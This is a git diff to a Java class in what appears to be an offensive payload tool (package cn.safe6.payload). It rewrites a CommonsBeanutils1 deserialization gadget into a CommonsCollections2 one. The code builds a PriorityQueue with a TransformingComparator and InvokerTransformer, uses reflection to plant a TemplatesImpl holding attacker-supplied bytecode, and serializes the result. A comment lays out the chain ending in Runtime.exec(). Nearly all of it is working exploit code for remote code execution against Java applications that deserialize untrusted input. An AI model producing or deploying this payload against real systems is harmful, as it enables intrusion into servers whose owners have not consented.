@@ -2,33 +2,51 @@ package cn.safe6.payload;
 
 import cn.safe6.util.Gadgets;
 import cn.safe6.util.Reflections;
-import org.apache.commons.beanutils.BeanComparator;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+
 
 import java.io.ByteArrayOutputStream;
 import java.io.ObjectOutputStream;
-import java.math.BigInteger;
 import java.util.PriorityQueue;
+import java.util.Queue;
 
-public class CommonsBeanutils1 {
+
+/*
+	Gadget chain:
+		ObjectInputStream.readObject()
+			PriorityQueue.readObject()
+				...
+					TransformingComparator.compare()
+						InvokerTransformer.transform()
+							Method.invoke()
+								Runtime.exec()
+ */
+
+@SuppressWarnings({"rawtypes", "unchecked"})
+
+public class CommonsCollections2 {
+
+
 
     public static byte[] getPayload(byte[] bytes) throws Exception {
         final Object templates = Gadgets.createTemplatesImpl(bytes);
         // mock method name until armed
-        final BeanComparator comparator = new BeanComparator("lowestSetBit");
+        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
 
         // create queue with numbers and basic comparator
-        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
+        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(transformer));
         // stub data for replacement later
-        queue.add(new BigInteger("1"));
-        queue.add(new BigInteger("1"));
+        queue.add(1);
+        queue.add(1);
 
         // switch method called by comparator
-        Reflections.setFieldValue(comparator, "property", "outputProperties");
+        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
 
         // switch contents of queue
         final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
         queueArray[0] = templates;
-        queueArray[1] = templates;
+        queueArray[1] = 1;
 
         ByteArrayOutputStream barr = new ByteArrayOutputStream();
         ObjectOutputStream oos = new ObjectOutputStream(barr);
@@ -37,4 +55,5 @@ public class CommonsBeanutils1 {
 
         return barr.toByteArray();
     }
+
 }
